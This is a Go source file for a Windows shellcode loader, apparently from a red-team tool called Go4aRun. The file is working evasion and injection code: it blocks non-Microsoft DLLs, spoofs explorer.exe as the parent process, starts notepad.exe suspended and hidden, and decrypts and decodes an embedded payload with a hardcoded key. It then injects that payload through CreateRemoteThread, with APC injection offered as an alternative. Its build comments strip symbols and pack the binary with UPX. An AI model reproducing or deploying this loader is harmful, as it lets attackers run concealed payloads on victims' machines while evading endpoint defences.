//GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" Go4it.go
//upx --brute Go4it.exe

package main

import (
	"Go4aRun/pkg/shelly"
	syscalls "Go4aRun/pkg/sliversyscalls/syscalls"
	"Go4aRun/pkg/useful"
	b64 "encoding/base64"
	"encoding/hex"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

func main() {

	// Change block dll behavior: between "not allowing non-MS" and "only store" through nonms and onlystore vars
	// Change parentName var to change spoofed parent
	// Change programPath var to change process launched by parent which shellcode will inject into
	// Change creationFlags to change behavior of programPath var launching
	// Select a Proc Injection Method by comment/uncommenting the sections CreateRemoteThread or QueueUserAPC

	//Enum and get the pid of specified process
	procThreadAttributeSize := uintptr(0)
	syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
	procHeap, err := syscalls.GetProcessHeap()
	attributeList, err := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"

	//Options for Block Dlls
	nonms := uintptr(0x100000000000) //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
	//onlystore := uintptr(0x300000000000) //"BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE"

	//Update to block dlls
	syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)

	//Search for intended Spoofed Parent process
	procs, err := useful.Processes()
	if err != nil {
		log.Fatal(err)
	}
	parentName := "explorer.exe" //Name of Spoofed Parent
	ParentInfo := useful.FindProcessByName(procs, parentName)
	if ParentInfo != nil {
		// found it

		//Spoof
		ppid := uint32(ParentInfo.ProcessID)
		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
		uintParentHandle := uintptr(parentHandle)
		syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil)

		var procInfo windows.ProcessInformation
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
		//startupInfo.ShowWindow = windows.SW_HIDE
		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.EXTENDED_STARTUPINFO_PRESENT
		programPath := "c:\\windows\\system32\\notepad.exe"
		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)

		// Decode shellcode
		hex2str, _ := hex.DecodeString(shelly.Sc)
		shellc := useful.Decrypt([]byte(hex2str), "D00mfist")
		cspay, _ := hex.DecodeString(string(shellc))
		decode, _ := b64.StdEncoding.DecodeString(string(cspay))

		// Inject into Process
		injectinto := int(procInfo.ProcessId)

		//Choose A Proc Injection Method//

		//CreateRemoteThread
		var Proc, R_Addr, F = useful.WriteShellcode(injectinto, decode)
		useful.ShellCodeCreateRemoteThread(Proc, R_Addr, F)

		//QueueUserAPC
		//var victimHandle = procInfo.Thread
		//var _, R_Addr, _ = useful.WriteShellcode(injectinto, decode)
		//useful.EBAPCQueue(R_Addr,victimHandle)
	}

}
